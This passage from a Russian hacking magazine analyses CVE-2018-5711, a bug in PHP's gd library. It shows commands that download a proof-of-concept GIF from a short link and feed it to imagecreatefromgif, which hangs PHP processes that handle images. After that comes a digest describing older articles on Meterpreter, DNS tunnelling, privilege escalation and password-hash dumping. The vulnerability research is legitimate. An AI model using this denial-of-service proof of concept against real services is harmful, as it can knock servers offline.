ну и пилоты сами не слепые.
   Что до тайны личной жиз ни, то на нее по большому счету теперь всем нап‐
левать. Да‐да, именно «наплевать». Сам посуди, ведь еще несколько десят‐
ков лет назад те публичные унижения, которые известные люди испы тывают
во время скандалов со сливом интимных фотографий, могли закончиться
отставкой  («человек, похожий на генерального прокурора»), убийством
или самоубийством. А что теперь? А теперь — «без комментариев».
ВЗЛОМ
 ЯДОВИТАЯ
 ГИФКА





                                                 aLLy
                                              ONsec
                                                    @iamsecurity





          ЭКСПЛУАТИРУЕМ
           УЯЗВИМОСТЬ
      В РАСШИРЕНИИ GD ДЛЯ PHP





Все любят забав ные гифки, но осо бый юмор — это повесить
сервер на PHP при помощи специально сформированного
файла GIF. Успешная эксплуатация бага, который мы раз‐
берем, приводит процесс в состояние бесконеч ного цик ла.
Создав множество таких процессов, атакующий исчерпает
ресурсы системы. Жертвой может стать любой сервис,
который производит манипуляции с картинками, написан
на PHP и использует библиотеку gd или libgd.


Уязвимость получила идентифика тор CVE‐2018‐5711, а обнаружил ее иссле‐
дователь Orange Tsai  (@orange_8361) из тайвань ской компании Devcore.
О деталях он написал в своем бло ге.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



ГОТОВИМСЯ К ЭКСПЛУАТАЦИИ
Главное, что нам понадобится, чтобы испытать баг, — это уязвимая версия
PHP. Их у нас целый пучок:
 • PHP 5 < 5.6.33,
 • PHP 7.0 < 7.0.27,
 • PHP 7.1 < 7.1.13,
 • PHP 7.2 < 7.2.1.

Выбирай любую, как говорится. Если хочешь контролировать процесс эксплу‐
атации и рассмотреть уяз вимость поб лиже, то тебе понадобится версия,
которая содержит дополнитель ную отладочную информацию (dbg‐версия).
Большинство  дистрибутивов  Linux  поз воля ют  установить  dbg‐версию
с помощью пакетного менеджера. Я буду использовать Debian 8 в контейнере
Docker.


docker run ‐‐rm ‐ti ‐‐cap‐add=SYS_PTRACE ‐‐security‐opt seccomp=
unconfined ‐‐name=phpgd ‐‐hostname=phpgd debian:jessie‐20171210 /bin/
bash
apt‐get update

В  моем  случае  в  репозитории  имелись  две  версии  дис трибутива:
5.6.33 и 5.6.30.


apt‐cache policy php5‐dbg





             Различные версии PHP в дистрибутиве Debian

Версия PHP 5.6.30 точно уяз вима, поэто му ее и установим.


apt‐get install ‐y php5‐dbg=5.6.30+dfsg‐0+deb8u1 \
        php5‐common=5.6.30+dfsg‐0+deb8u1 \
        libapache2‐mod‐php5=5.6.30+dfsg‐0+deb8u1 \
        php5‐cgi=5.6.30+dfsg‐0+deb8u1 \
        php5‐cli=5.6.30+dfsg‐0+deb8u1 \
        php5‐fpm=5.6.30+dfsg‐0+deb8u1 \
        libphp5‐embed=5.6.30+dfsg‐0+deb8u1 \
        php5‐curl=5.6.30+dfsg‐0+deb8u1 \
        php5‐enchant=5.6.30+dfsg‐0+deb8u1 \
        php5‐gd=5.6.30+dfsg‐0+deb8u1 \
        php5‐gmp=5.6.30+dfsg‐0+deb8u1 \
        php5‐imap=5.6.30+dfsg‐0+deb8u1 \
        php5‐interbase=5.6.30+dfsg‐0+deb8u1 \
        php5‐intl=5.6.30+dfsg‐0+deb8u1 \
        php5‐ldap=5.6.30+dfsg‐0+deb8u1 \
        php5‐mcrypt=5.6.30+dfsg‐0+deb8u1 \
        php5‐readline=5.6.30+dfsg‐0+deb8u1 \
        php5‐mysql=5.6.30+dfsg‐0+deb8u1 \
        php5‐odbc=5.6.30+dfsg‐0+deb8u1 \
        php5‐pgsql=5.6.30+dfsg‐0+deb8u1 \
        php5‐pspell=5.6.30+dfsg‐0+deb8u1 \
        php5‐recode=5.6.30+dfsg‐0+deb8u1 \
        php5‐snmp=5.6.30+dfsg‐0+deb8u1 \
        php5‐sqlite=5.6.30+dfsg‐0+deb8u1 \
        php5‐sybase=5.6.30+dfsg‐0+deb8u1 \
        php5‐tidy=5.6.30+dfsg‐0+deb8u1 \
        php5‐xmlrpc=5.6.30+dfsg‐0+deb8u1 \
        php5‐xsl=5.6.30+dfsg‐0+deb8u1 \
        curl vim nano





               Установленная уяз вимая версия PHP 5.6.30

Такая огромная пор тянка получилась, потому что дистрибутив отказывался
устанавливаться, ссылаясь на то, что я пыта юсь уста новить версию PHP ниже,
чем версии его зависимостей. Это показа лось мне самым простым решени‐
ем, не исключено, что есть и более элегантный способ.
  Возможно, на тот момент, когда ты будешь читать эту статью, в репози‐
ториях появятся пропатченные версии дистрибутива. Тогда ничего не оста‐
нется, кроме как скомпилировать PHP из исходни ков вручную. Для этого мож‐
но воспользоваться тем же контейнером, только теперь нужно установить
среду для компиляции и все необходимые зависи мости.


apt‐get install ‐y build‐essential git autoconf automake libtool
re2c bison libxml2‐dev libgd‐dev curl vim nano gdb

Для разнообразия теперь возь мем версию 7.0.26.


git clone ‐‐branch PHP‐7.0.26 ‐‐depth 1 https://github.com/php/
php‐src.git

Осталось только сконфигурировать. По сути, из расширений нам нужен толь‐
ко gd.


cd php‐src
./buildconf ‐‐force
./configure ‐‐with‐gd ‐‐enable‐debug

Ну а затем стандартное:


make
make install





            Све жескомпилиро ванная уяз вимая версия PHP


УЯЗВИМОСТЬ
Первым делом скачаем экс пло ит — это специально сформированная гифка,
которая и вызывает проблемы у парсера.


curl ‐L https://git.io/vN0n4 | xxd ‐r > poc.gif

Уязвимы функции imagecreatefromgif и imagecreatefromstring, которые
в качестве параметров принимают GIF: пер вая в виде файла, вторая в виде
строки. Поэтому проверить работоспособ ность PoC можно следующим обра‐
зом:


php ‐r 'imagecreatefromgif("poc.gif");'

Посмотрим, как работает эта уязвимость. Нас интересу ет цикл while из фун‐
кции LWZReadByte_, что находится в файле gd_gif_in.c.


/ext/gd/libgd/gd_gif_in.c
430: static int
431: LWZReadByte_(gdIOCtx *fd, LZW_STATIC_DATA *sd, char flag, int
input_code_size, int *ZeroDataBlockP)
432: {
...
461:            GetCode(fd, &sd‐>scd, sd‐>code_size, FALSE, ZeroDa
taBlockP);

Во время его выпол нения вызывается функция GetCode, это простая обертка
над GetCode_ из того же файла.


gd_gif_in.c
419: static int
420: GetCode(gdIOCtx *fd, CODE_STATIC_DATA *scd, int code_size, int
flag, int *ZeroDataBlockP)
421: {
422:    int rv;
423:
424:  rv = GetCode_(fd, scd, code_size,flag, ZeroDataBlockP);
425:  if (VERBOSE) printf("[GetCode(,%d,%d) returning %d]\n",code_s
ize,flag,rv);
426:    return(rv);
427: }


gd_gif_in.c
374: static int
375: GetCode_(gdIOCtx *fd, CODE_STATIC_DATA *scd, int code_size, int
flag, int *ZeroDataBlockP)
376: {
377:    int           i, j, ret;
378:    unsigned char count;
...
398:         if ((count = GetDataBlock(fd, &scd‐>buf[2], ZeroDa
taBlockP)) <= 0)
399:            scd‐>done = TRUE;
...
404:    }

Обрати внимание на функцию GetDataBlock (строка 398). Это тоже обер‐
тка — над GetDataBlock_, которая как раз читает блоки данных из передан‐
ного в библиотеку файла GIF.


gd_gif_in.c
350: static int
351: GetDataBlock(gdIOCtx *fd, unsigned char *buf, int *ZeroDa
taBlockP)
352: {
353:    int rv;
354:    int i;
355:
356:    rv = GetDataBlock_(fd,buf, ZeroDataBlockP);
...
370:    return(rv);
371: }


gd_gif_in.c
331: static int
332: GetDataBlock_(gdIOCtx *fd, unsigned char *buf, int *ZeroDa
taBlockP)
333: {
334:    unsigned char   count;
335:
336:    if (! ReadOK(fd,&count,1)) {
337:        return ‐1;
338:    }
339:
340:    *ZeroDataBlockP = count == 0;
341:
342:    if ((count != 0) && (! ReadOK(fd, buf, count))) {
343:        return ‐1;
344:    }
345:
346:    return count;
347: }





                  От ладка функции GetDataBlock_

Функция возвращает раз мер прочитанных данных в виде переменной count,
а когда доходит до конца файла, то воз вра щает ‐1. Чтобы выпол нение цикла
чтения закончилось, переменная scd‐>done должна принять значение true.


gd_gif_in.c
389:        if (scd‐>done) {
390:            if (scd‐>curbit >= scd‐>lastbit) {
391:                /* Oh well */
392:            }
393:            return ‐1;
394:        }

А для этого должно выполнять ся неравенс тво count <= 0.


gd_gif_in.c
398:         if ((count = GetDataBlock(fd, &scd‐>buf[2], ZeroDa
taBlockP)) <= 0)
399:            scd‐>done = TRUE;

Только вот тип переменной count — unsigned  char, а это значит, что
переменная  принимает  только однобайтовые положительные  значения
(диапазон от 0 до 255) и быть мень ше нуля никак не может. Именно поэтому
одна часть усло вия count  <=  0 (строка 398 из gd_gif_in.c) никогда
не будет выполнена. Вторую часть (count == 0) тоже нетрудно обойти, ведь
размер блока указывается в самом файле.





              Значение переменной count берет ся из GIF

Самое время расчехлять отладчик и ста вить брейк‐пойнты на инте ресующие
нас три функции.


b LWZReadByte_
b GetCode_
b GetDataBlock_

Нас интересует тот самый цикл while из функции LWZReadByte_ (стро‐
ка 462 в gd_gif_in.c). Мы сможем превратить его в бесконечный, если
будет выполняться условие sd‐>firstcode == sd‐>clear_code.


/ext/gd/libgd/gd_gif_in.c
459:        do {
460:            sd‐>firstcode = sd‐>oldcode =
461:            GetCode(fd, &sd‐>scd, sd‐>code_size, FALSE, ZeroDa
taBlockP);
462:        } while (sd‐>firstcode == sd‐>clear_code);

Значение sd‐>clear_code высчитыва ется при первом выполнении LWZRead‐
Byte_.


gd_gif_in.c
436:        sd‐>set_code_size = input_code_size;
437:        sd‐>code_size = sd‐>set_code_size+1;
438:        sd‐>clear_code = 1 << sd‐>set_code_size ;

Переменная input_code_size так же, как и count, берется из гифки, а даль‐
ше из нее получается sd‐>clear_code путем сдвигания 0x1 влево на input_‐
code_size разрядов.





       Переменная input_code_size и вычисление sd‐>clear_code

В нашем случае sd‐>clear_code = 8. Дальше дело за sd‐>firstcode —
это результат выполнения функции GetCode. Сам блок данных в PoC сделан
так, чтобы функция тоже возвращала 8.





         Специально сфор мированный блок данных в эксплоите


gd_gif_in.c
409:        ret = 0;
410:        for (i = scd‐>curbit, j = 0; j < code_size; ++i, ++j) {
411:            ret |= ((scd‐>buf[i / 8] & (1 << (i % 8))) != 0) << j
;
412:        }
...
416:    return ret;

А еще обрати внимание на этот кусок кода:


gd_gif_in.c
388:    if ( (scd‐>curbit + code_size) >= scd‐>lastbit) {
...
401:        scd‐>last_byte = 2 + count;
402:        scd‐>curbit = (scd‐>curbit ‐ scd‐>lastbit) + 16;
403:        scd‐>lastbit = (2+count)*8 ;

Когда следующий бит на чтение больше, чем общий раз мер блока, перемен‐
ная scd‐>curbit сбрасывается — из текущего значения вычитается scd‐>
lastbit, а scd‐>lastbit у нас зависит от count.


scd‐>lastbit = (2+count)*8 => scd‐>lastbit = (2+0xff)*8 => scd‐>
lastbit = 2056

Дальше по коду выполняется следующая проверка:


gd_gif_in.c
406:    if ((scd‐>curbit + code_size ‐ 1) >= (CSD_BUF_SIZE * 8)) {
407:        ret = ‐1;
...
415:    scd‐>curbit += code_size;
416:    return ret;

Если условие выпол нится, то переменная ret ста нет равна ‐1 и мы выйдем
из цикла. Но этого не произойдет из‐за того, что отрабатывает код, который
мы разобрали чуть выше. Пра вая часть усло вия из строки 406 равна 2240.


CSD_BUF_SIZE * 8 = 280 * 8 = 2240


gd_gif_in.c
75: #define CSD_BUF_SIZE 280

А code_size у нас равен 4.


gd_gif_in.c
436:        sd‐>set_code_size = input_code_size; // 3
437:        sd‐>code_size = sd‐>set_code_size+1; // 4

Дальше идет простая логика: максимальное зна чение, которое может при‐
нять scd‐>curbit, исходя из условия равно 2052. Дальше выпол нится тело
условия из стро ки 388. Только вот GetDataBlock не сде лает scd‐>done рав‐
ной true из‐за бага, и поэто му счетчик чтения сбросится, а сле дующая ите‐
рация просто начнет читать весь блок с самого начала, и так до бес конеч‐
ности.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Такие уязвимости подтверждают, что не важно, сколько лет коду и сколько
раз проводили его аудит. Может появиться новый способ эксплуатации,
а может вдруг оказаться актуальным ста рый. С точки зрения программиста
урок другой: надо не забывать внимательно следить за результатами опе‐
раций с переменными в языках со стро гой типизацией.
  Описанной уязвимости подвержена и биб лиотека libgd, о чем иссле дова‐
тель сообщил в своем блоге. Так что, если ты разрабаты ваешь или под‐
держиваешь сервис на PHP, который что‐то делает с картинками, немедленно
ставь обновления или оповещай администраторов о необходимости этого.
ВЗЛОМ

АЛМАЗНЫЙ ФОНД
 «ХАКЕРА»
             Часть 2





                                       Иван Пискунов





        ВАЖНЫЕ МАТЕРИАЛЫ
     ПО ВЗЛОМУ ЗА ПОСЛЕДНИЕ
          НЕСКОЛЬКО ЛЕТ





Если бы мы захотели сделать книгу на основе самых крутых
хакерских статей, опубликованных в нашем журнале, ее тол‐
щина была бы такой, что если положить все изданные тома
друг на друга, то получив шаяся башня была бы высотой
с небоскреб Бурдж‐Халифа. Ладно‐ладно, «это не точ но» :).
Ведь зачем издавать исторические, потерявшие свою акту‐
альность статьи? Вместо этого мы соберем в один материал
самые крутые тексты по информацион ной безопасности,
которые были опубликованы за последние несколько лет
и которые ты мог и пропустить.


В прошлом выпуске мы сделали подборку по реверсингу и анализу malware‐
кода, которая в первую очередь была интересна программис там, ревер‐
серам и софтверным инженерам. Сегодня же представляем твоему вни‐
манию статьи, посвященные преимущественно хакерскому ремеслу — всему,
что связано со взломами ОС, СУБД, тес тирова нием ИТ‐шной инфраструк‐
туры на проникновение, уязвимос тями ОС и прикладного ПО. Также тебя ждут
подзабытые или малоизвестные фичи и трюки, которые пригодятся на прак‐
тике, если ты истинно предан нашему делу! Обрати внимание: только
перечисление этих статей заняло бы шесть полноценных полос старого
бумажного «Хакера». :)


КРИМИНАЛИСТИЧЕСКИЙ АНАЛИЗ ПАМЯТИ. ИССЛЕДУЕМ
ПРОЦЕССЫ В WINDOWS 7





                       Скачать PDF

  После взлома или утечки данных, когда инцидент уже слу чил ся и замол‐
чать его не получается :), в дело включаются криминалисты по компьютерной
безопасности, или, как их час то называют, форензик‐эксперты. В поисках
«нулевого пациента», через которо го и про изошел взлом, им приходится
заниматься сбором и ана лизом доказа тельств. В этой статье ты поз‐
накомишься с некоторыми техниками анализа опе ративной памяти,
исследованием процес сов  в  Windows, спо собами выявления  руткитов,
использующих  недокументированные  возможности ядра  NT, и  узнаешь
кое‐какие малоизвестные кодерские трю ки.
  Материал пригодится всем занимающимся или прос то интересующимся
форензикой.


РУЧНАЯ РЕАНИМАЦИЯ ДАМПА ПАМЯТИ. РУКОВОДСТВО ПО
РУЧНОМУ ВОССТАНОВЛЕНИЮ ПАМЯТИ





                       Скачать PDF

   Частая ситуация: код надеж но запакован и для анализа программы
или мал вари приходится делать дамп памяти, что бы потом уже ковырять его
вручную дру гими инстру ментами. Но есть трабл — сня тый дамп может ока‐
заться битым, то есть непригодным для ана лиза. И как же быть в таком слу‐
чае? Как раз в этой статье, мой друг, тебе и рас ска жут, как грамотно сдам-
пить образ из памяти и как его восстановить, если он поврежден. Если ты
реверсер или форензик‐эксперт, поверь, это когда‐нибудь тебе точно при‐
годится!


ЛАБОРАТОРНЫЙ ПРАКТИКУМ ПО METASPLOIT FRAMEWORK.
СКРЫТЫЕ ФИШКИ MSF





                       Скачать PDF

   Кто не знает MSF? Этот «швейцарский нож» входит в пятерку самых юза‐
емых тулз пентестера, да и прос то любого мало‐маль ски продвинутого спе ца
по безопасности. Инстру мент пос тоянно развива ется и обновля ется, появ‐
ляется много новых фич и малоизвестных опций, которые легко упустить,
а ведь они реально рас ширя ют воз можнос ти или делают работу гораздо
удобнее и комфор тнее. Немало важную часть занимает и автоматизация час‐
то повторяющих ся операций. В представленном материале речь пойдет
о некоторых фишках MSF, более‐менее продвинутых встроенных возможнос‐
тях инструмента, а также о возможностях автоматизации рутинных операций,
которая сэкономит тебе кучу времени. Ты прос то обя зан это знать!


METERPRETER В ДЕЛЕ. ХИТРЫЕ ПРИЕМЫ ЧЕРЕЗ MSF





                       Скачать PDF

   Те, кто хоть как‐то погружался в тему работы с Metasploit Framework, зна‐
ют, как много возможностей на уязвимой машине дает правильно проб‐
рошенная «полезная нагрузка». Речь идет о Meterpreter, универсальном ad‐
vanced payload’е, — как о том, что туда вложено, так и о том, что мы можем
допилить ручками. Ты узна ешь, как пра вильно и эффективно юзать payload
с пользой для себя, какие фичи есть у Meterpreter, ну и конечно же, сможешь
обкатать все это на практике. В связ ке с предыду щей статьей про Metasploit
Framework получается настоящий must read для начинающе го или уже чуть
более продвинутого пентестера.


DNS. ОБРАТНАЯ СВЯЗЬ. ОБХОДИМ ПРЕГРАДЫ И
ОРГАНИЗОВЫВАЕМ ДОСТУП В СЕТЬ





                       Скачать PDF

   Итак, ты попал на уяз вимую машину в корпоративной сети крупной ком‐
пании. Однако файрвол режет все неиз вес тные соединения, а список портов,
на которые можно подключиться, фиксирован. Соответственно, Reverse tcp
shell и тем более bind tcp shell работать уже не будут. И неуже ли наша машин‐
ка так и останется недося гаема? Вот тут на помощь тебе придет трюк
с инкапсуляцией коннекта в легитимный DNS‐тра фик уяз вимой машины.
Думаешь, сложно? В материале тебе как раз и расскажут о DNS и о том,
как можно поиграть с GET/POST‐запросами, чтобы незаметно просочиться
за корпоративный периметр.


DNS: ОБРАТНАЯ СВЯЗЬ. ПРОДВИНУТЫЙ PAYLOAD ДЛЯ
ОРГАНИЗАЦИИ ТУННЕЛЯ





                       Скачать PDF

   Что, если уязвимая машина вообще не имеет доступа в интернет или пра‐
вила фильтрации трафика нас только жесткие, что про кинуть туннель, как опи‐
сано в предыдущем материале, не получится? Во второй части статьи
про DNS‐туннелирование рас ска зывается, как решать эту проб лему, исполь‐
зуя более хитрые и изощ ренные техники. Ты узна ешь, как модифицировать
шелл таким образом, чтобы он получал управляющие команды, завернутые
внутрь служебного трафика, как поднять бот, выполняющий всю эту рутину, ну
и, собственно, как с помощью всего это го получить доступ к нужной нам тач‐
ке.


АТАКИ НА DNS: ВЧЕРА, СЕГОДНЯ, ЗАВТРА. GHOST DOMAIN NAMES
И ДРУГИЕ 0DAY-СПОСОБЫ ВЗЛОМА СИСТЕМЫ ДОМЕННЫХ ИМЕН





                       Скачать PDF

  Слышал про атаки на DNS? Неког да нашумевшая атака Ghost Domain
Names имеет шанс на реализацию и сейчас. Про нее и другие способы атак
на доменную систему рас ска зывается в этой статье.


НЕ ВЕРЬ СВОИМ ГЛАЗАМ. АКТУАЛЬНЫЕ МЕТОДЫ СПУФИНГА В
НАШИ ДНИ





                 Читать или скачать PDF

   Расцвет спуфинг‐атак пришелся на времена по нынешним меркам исто‐
рические. Однако и по сей день оста ются методы и инстру менты, позволя‐
ющие успешно подменить объекты в сетевом сег менте. Это довольно рис‐
кованная часть атак, например на системы дистанционного банковского
обслуживания, также она часто используется в шаб лонных пентестах. Из дан‐
ной статьи ты пой мешь, насколько легко провернуть спуфинг‐атаку и к чему
это может в дальнейшем привести.


НЕДОСТАТОЧНО ПРАВ? ДОСТАТОЧНО: 8 ПРИЕМОВ ДЛЯ ОБХОДА
ГРУППОВЫХ ПОЛИТИК В ДОМЕНЕ





                       Скачать PDF

   Чувствуешь себя гос тем на рабочем ноут буке? Мечтаешь настроить
рабочий стол, браузер, сеть и систему обновлений под себя? Твоему вни‐
манию представлен набор из восьми трю ков, поз воляющих так или иначе
обойти применение групповых политик домена. Конечно, часть приемов уже
может не работать на «десятке», но ста рые версии винды (ХР — 7) все
еще живы на кор поративных машинах, да и многие старые баги все
еще работают. В статье дает ся набор готовых к применению рецептов, ты
можешь провер нуть их на сво ем компьюте ре и доказать админам, что GPO
не так уж и хороша, как ее хва лят.


ИДЕМ НА ПОВЫШЕНИЕ. РЕЦЕПТЫ ПОДНЯТИЯ ПРИВИЛЕГИЙ ПОД
WINDOWS





                 Читать или скачать PDF

  Продолжаем тему трепана ции Windows. Когда ты выполняешь пентест
или проникаешь в других целях, к примеру, на домен Active Directory, машину,
на которой хостится сайт, или рабочее мес то бухгалтера с 1С, перед тобой
почти обязательно встанет задача поднятия своих привилегий. Ибо от ее
решения будет зависеть, сможешь ли ты продвинуться дальше или нет.
В этой статье описано все (ну или почти все), что касается продвижения
вверх в Windows‐системах, — один надцать техник, которые помогут тебе
пройти путь от гостя до локального или доменного админа.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
АЛМАЗНЫЙ ФОНД «ХАКЕРА»
                ВАЖНЫЕ МАТЕРИАЛЫ ПО ВЗЛОМУ
                    ЗА ПОСЛЕДНИЕ НЕСКОЛЬКО ЛЕТ





АТАКИ НА ДОМЕН. ЗАВЛАДЕВАЕМ КОРПОРАТИВНОЙ СЕТЬЮ





                       Скачать PDF

  Абсолютное большинство компаний для пользовательского корпоратив‐
ного сектора юзают в качестве базы Windows Server и службу каталогов Active
Directory, даже если остальные стойки у них под завязку забиты тачками
с  *NIX’ами. Поэтому  контроль над доменом —  это лакомый  кусочек
для любого хакера или пентестера. Соответственно, тебе никак не обойтись
без привилегий админис тра тора. А вот как их получить — об этом и пойдет
разговор в данной статье. Уязвимос ти в сетевых служ бах и ОС, дыры в архи‐
тектуре сети и проб лемы аутентифика ции, SMB Relay и неувядающий со вре‐
менем ARP spooﬁng... Must read для всех интересу ющихся пентестами.


ВЕРНИТЕ ПРАВА! КАК ОБОЙТИ ОГРАНИЧЕНИЯ НА РАБОЧЕМ
КОМПЬЮТЕРЕ





                 Читать или скачать PDF

  Еще один материал на тему получения прав админа на локальной
или сетевой машине. Приведено очень много рецептов и техник, так что, если
какие‐то уже и не работа ют, все равно есть шанс на успех. В ход идут
и «инсайдерские» флешки, и загрузка со скрытого раздела, использование
альтернативных потоков NTFS в обход файловых разрешений. Довольно мно‐
го внимания уделено активации запрещенных USB‐портов. Вдобавок узна‐
ешь про фишки с ярлыками, дефорсирова ние групповых политик и обход зап‐
ретов на запуск софта, не прописанного в white‐лис тах. Как тебе такой
набор? Ты точно найдешь что‐то для себя, а пентестеру и вовсе обя зательно
к изучению.


ИЗУЧАЕМ И ВСКРЫВАЕМ BITLOCKER. КАК УСТРОЕНА ЗАЩИТА
ДИСКОВ WINDOWS И ЧТО НУЖНО ДЛЯ ЕЕ ВЗЛОМА





                 Читать или скачать PDF

  Шифрование локальных дисков и съемных носителей — одна из основ
обеспечения безопасности Windows, заявленная ее разработчиками. Если
отойти от маркетинговых обещаний и пиара, нас коль ко технология надежна?
Ведь она очень часто применяется в корпоративном секторе по умол чанию.
В этой статье мы подробно разберем устройство разных версий BitLocker
(включая пре дустановленные в пос ледние сборки Windows 10) и, конечно же,
покажем, как обойти этот встроенный механизм защиты. А юзать пос ле этого
BitLocker или нет — решай сам.


7 РЕЦЕПТОВ ПРИГОТОВЛЕНИЯ WINDOWS-ПАРОЛЕЙ. КАК
СДАМПИТЬ И ИСПОЛЬЗОВАТЬ ХЕШИ ПАРОЛЕЙ ОТ УЧЕТОК WIN-
DOWS-СИСТЕМЫ





                 Читать или скачать PDF

   Когда‐то в старые времена дамп и дальнейший брут паролей от админ‐
ских учеток был верным и очень популярным способом получить администра‐
тивные привилегии. Сейчас, с раз витием дру гих механизмов защиты, тема
несколько подустарела, но все еще остается живой!
  В статье приведен полный сборник рецептов, опи сывающих, как сдампить
хеши пользовательских паролей, вос становить исходный пасс путем брут‐
форса  (перебора) и  получить  с помощью  извлеченного хеша дос туп
к защищенным ресурсам, используя недоработки протокола аутентификации
NTLM. И ценность материала в том, что в нем минимум теории — только
практика. Реальный кейс для пентестера!


НЕ СЫПЬ МНЕ СОЛЬ НА PASSWORD. РЕАНИМИРУЕМ УМЕРШИЙ
MD5





                       Скачать PDF

  Мы уже подробно рас сказали в предыдущем материале о взломе паролей
от учеток на Windows‐машинах. В продолжение темы поговорим о так называ‐
емых соленых хешах, взлом которых требует чуть дру гого подхода. Речь пре‐
имущественно пой дет об алго ритме MD5, его недостатках — появлении кол‐
лизий (повторов) и о том, как это мож но использовать в целях успешного бру‐
та. Если ты кодер и готов писать скрипты по экс плуатации огрехов в MD5, этот
материал точно для тебя!


АНОНИМНЫЙ ШТУРМ WINDOWS. ХИТРЫЕ ПРИЕМЫ БЫВАЛОГО
ХАКЕРА





                       Скачать PDF

   Статья возвращает нас в эпо ху операционных систем от XP до Vista,
показывая, как при помощи уже давно известных, но по‐прежнему рабочих
фич можно получить список пользователей через нулевую сес сию, захватить
терминальное подклю чение RDP и что можно отконфигурировать в сис‐
темном реестре, чтобы уберечь ся от нежелатель ных глаз и шаловливых
ручек.


УГНАТЬ ЗА 60 СЕКУНД. МЕТОД ДОБЫЧИ УДАЛЕННОГО ДЕДИКА
ПОД УПРАВЛЕНИЕМ WINDOWS





                       Скачать PDF

  Мечтал когда‐нибудь захватить чужой сервер и почувс твовать себя богом?
:) В материале содержатся реальные советы, как угнать удаленный сервак
с помощью все того же MSF и нес кольких видов shell в формате Meterpreter.
Конечно, на данную уязвимость уже давно выпущен патч, но, как извес тно,
до сих пор в Сети можно найти тачки, на которых крутится устаревшая
или необновленная ОС. Воору жившись сведениями после прочтения статьи,
ты можешь попытать свои силы и уда чу. А вдруг?


СЦЕНАРИЙ ДЛЯ ВЗЛОМА. РАЗБИРАЕМ ТИПОВЫЕ СЦЕНАРИИ АТАК
НА КОРПОРАТИВНЫЕ СЕТИ





                 Читать или скачать PDF

   Эта статья основана на многолет нем опыте пентестеров из Positive Tech‐
nologies, которые ежегодно выполняют сотни тестирований на проник‐
новение для крупнейших компаний как в Рос сии, так и за рубежом. За это
время  у экспертов накопилось большое количество типовых  ситуаций
и общих кейсов, расска зывающих о наиболее типичных сценариях успешных
атак, которые позволяли получить контроль над сетью заказчика в 80% слу‐
чаев. В материале рассматриваются рас пространенные ошибки и общие
варианты взлома компаний. Читая статью, ты сможешь проанализировать,
насколько твоя сеть защищена, а если ты и сам пентестер, то получишь в руки
набор сценариев, готовых к употреблению.


МЕРЯЕМ УЯЗВИМОСТИ. КЛАССИФИКАТОРЫ И МЕТРИКИ
КОМПЬЮТЕРНЫХ БРЕШЕЙ





                       Скачать PDF

  Последнее время все чаще и чаще слышишь фра зы: «Там уязвимость, тут
уязвимость, в этом софте нашли брешь, в том сервисе дырка». И на каждую
такую  уязвимость  выходит  бюллетень,  опи сывающий  саму  проблему,
рекомендации разработчиков и другие меры, которые можно принять
для собственной защиты. Вся эта информа ция пуб лику ется на баг‐тре ках,
специальных сайтах, собирающих информацию об  уязвимостях. Любой
может ознакомиться с этой информацией, а более предприимчивые на чер‐
ном рынке всегда могут купить экс плоит под данную уязвимость или готовый
инструмент для атаки. Когда ты читал подоб ные обзоры, наверняка замечал,
что каждый баг определенным обра зом клас сифицируется. Что собой пред‐
ставляет «измерение уязвимос ти», по каким критериям оно производится
и зачем это вообще нужно знать? Ответы ты най дешь в этой статье.


РАЗВРАТНО-ОРИЕНТИРОВАННОЕ ПРОГРАММИРОВАНИЕ. ТРЮКИ
ROP, ПРИВОДЯЩИЕ К ПОБЕДЕ





                       Скачать PDF

  Копая  тему  уязвимостей  и  экс плоитов,  неред ко можно  услышать
про «переполнение буфера», вследс твие которого далее можно добиться
выпол нения произволь ного кода на системе жертвы. Так вот, этот баг можно
создать целенаправлен но, к примеру при помощи метода обратно ориенти‐
рованного программирова ния, или ROP. Данная техника, использующая фун‐
кции освобожденной памяти, ошибки форматной строки и так далее, поможет
справиться с механизмами защиты DEP и даже ASLR. Экс плоит, рас простра‐
няющий malware и эксплуатирующий уязвимость в Acrobat Reader (CVE‐2010‐
0188), как раз яркий тому пример. Кро ме того, этот же метод некогда исполь‐
зовал ся на pwn2own для взло ма iPhone и в экс плоите против PHP 6.0 DEV.
Как это сделать — читай в этой статье.


ЭКСПЛОИТ «НА КОЛЕНКЕ». ПИШЕМ ЭКСПЛОИТ ПОДРУЧНЫМИ
СРЕДСТВАМИ





                       Скачать PDF

  Лю бому продвинутому пентестеру рано или поздно при ходится стал‐
киваться с задачей соз дать экспло ит под конкрет ный сервис или систему.
Хотя теоретических материалов много, до сих пор ощущается дефицит прак‐
тических и понятных примеров. В этой статье задачей было написать работа‐
ющий эксплоит для конкретной прог раммы. Мы разберем все тонкости
и попытаемся понять, как именно находят уяз вимос ти и успешно ими поль‐
зуются. Если ты реверсер или пентестер — к прочтению обязательно!


КОВЫРЯЕМ БРОНЮ WINDOWS. ВЫЯСНЯЕМ, ЧТО ТАКОЕ ACL/DACL
И КАК ЭТО МОЖНО ЗАЭКСПЛОИТИТЬ





                       Скачать PDF

  В основе безопасности файловой системы NTFS заложены спис ки контро‐
ля доступа, они же ACL, и основанного на нем сис темного списка управле ния
файловыми разрешениями. Нес мотря на то что NTFS показы вает себя весь‐
ма стойкой ФС, как говорил Мальчиш‐Кибаль чиш, «есть у русских тайные
ходы, и вам их не засыпать». Ведь если обойти огра ничения ACL, хакер может
получить привиле гированный доступ абсолютно к любым файлам, в том числе
и системным, что уже таит в себе серь езные рис ки. В материале рас крывает‐
ся теория ACL/DACL, расска зывается, с чем здесь можно поковыряться, и,
конечно же, рассмотрены примеры, как найденные недостатки можно поэкс‐
плуатировать в свою пользу.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
АЛМАЗНЫЙ ФОНД «ХАКЕРА»
                ВАЖНЫЕ МАТЕРИАЛЫ ПО ВЗЛОМУ
                    ЗА ПОСЛЕДНИЕ НЕСКОЛЬКО ЛЕТ





УКРОЩЕНИЕ ДИКОЙ КИСКИ, ИЛИ СЛИВАЕМ ПАРОЛИ
ЧЕМОДАНАМИ. ВЗЛОМ МАРШРУТИЗАТОРОВ ЧЕРЕЗ ИЗЪЯНЫ
SNMP





                       Скачать PDF

  Не секрет, что Cisco — самый популярный вен дор сетевого оборудования.
И поэтому не сто ит доказывать, что в подавляющем большинстве компаний
